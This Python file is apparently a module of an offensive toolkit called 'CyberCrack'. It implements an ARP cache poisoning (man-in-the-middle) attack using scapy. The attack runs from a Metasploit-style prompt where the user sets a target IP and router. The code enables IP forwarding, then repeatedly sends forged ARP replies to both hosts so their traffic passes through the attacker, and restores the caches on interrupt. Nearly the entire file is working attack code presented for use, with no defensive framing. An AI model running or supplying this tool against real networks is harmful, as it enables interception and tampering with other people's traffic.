from scapy.all import *
def arp_spoof():
    def help():
        print(r"""
    : set T_IP               The target ip
    : set T_ROUTER           The target router
    : run or exploit         run the script
                            """)

    def arp_spoofer_tool(target, host):
        import time
        import os
        import sys
        def _enable_linux_iproute():
            """
            Enables IP route ( IP Forward ) in linux-based distro
            """
            file_path = "/proc/sys/net/ipv4/ip_forward"
            with open(file_path) as f:
                if f.read() == 1:
                    # already enabled
                    return
            with open(file_path, "w") as f:
                print(1, file=f)

        def _enable_windows_iproute():
            """
            Enables IP route (IP Forwarding) in Windows
            """
            from services import WService
            # enable Remote Access service
            service = WService("RemoteAccess")
            service.start()

        def enable_ip_route(verbose=True):
            """
            Enables IP forwarding
            """
            if verbose:
                print("[!] Enabling IP Routing...")
            _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
            if verbose:
                print("[!] IP Routing enabled.")

        def get_mac(ip):
            """
            Returns MAC address of any device connected to the network
            If ip is down, returns None instead
            """
            ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
            if ans:
                return ans[0][1].src

        def spoof(target_ip, host_ip, verbose=True):
            """
            Spoofs `target_ip` saying that we are `host_ip`.
            it is accomplished by changing the ARP cache of the target (poisoning)
            """
            # get the mac address of the target
            target_mac = get_mac(target_ip)
            # craft the arp 'is-at' operation packet, in other words; an ARP response
            # we don't specify 'hwsrc' (source MAC address)
            # because by default, 'hwsrc' is the real MAC address of the sender (ours)
            arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
            # send the packet
            # verbose = 0 means that we send the packet without printing any thing
            send(arp_response, verbose=0)
            if verbose:
                # get the MAC address of the default interface we are using
                self_mac = ARP().hwsrc
                print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

        def restore(target_ip, host_ip, verbose=True):
            """
            Restores the normal process of a regular network
            This is done by sending the original informations
            (real IP and MAC of `host_ip` ) to `target_ip`
            """
            # get the real MAC address of target
            target_mac = get_mac(target_ip)
            # get the real MAC address of spoofed (gateway, i.e router)
            host_mac = get_mac(host_ip)
            # crafting the restoring packet
            arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
            # sending the restoring packet
            # to restore the network to its normal process
            # we send each reply seven times for a good measure (count=7)
            send(arp_response, verbose=0, count=7)
            if verbose:
                print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

        verbose = True
        try:
            while True:
                spoof(target, host, verbose)
                spoof(host, target, verbose)
                time.sleep(1)
        except KeyboardInterrupt:
            print("[!] Detected CTRL+C ! restoring the network, please wait...")
            restore(target, host)
            restore(host, target)

    while True:
        import scapy.error as scapy_error
        try:
            user_in = input("CyberCrack: CyberServe/spoof/arp_spoof > ")
            if user_in.startswith("set"):
                if user_in.split()[1] == "T_IP":
                    target = user_in.split()[2]
                    print("T_IP = " + str(target))
                elif user_in.split()[1] == "T_ROUTER":
                    host = user_in.split()[2]
                    print("T_ROUTER = " + str(host))
                else:
                    print("Invalid parameter for set")
            elif user_in == "run" or user_in == "exploit":
                arp_spoofer_tool(target=target, host=host)
            elif user_in == "help" or user_in == "show options":
                help()
            else:
                print("Invalid command")
        except KeyboardInterrupt:
            break
        except NameError:
            print("[+] Assign all parameters related for this exploit")
        except scapy_error.Scapy_Exception:
            print("[+] Something went wrong check the target, router and connection")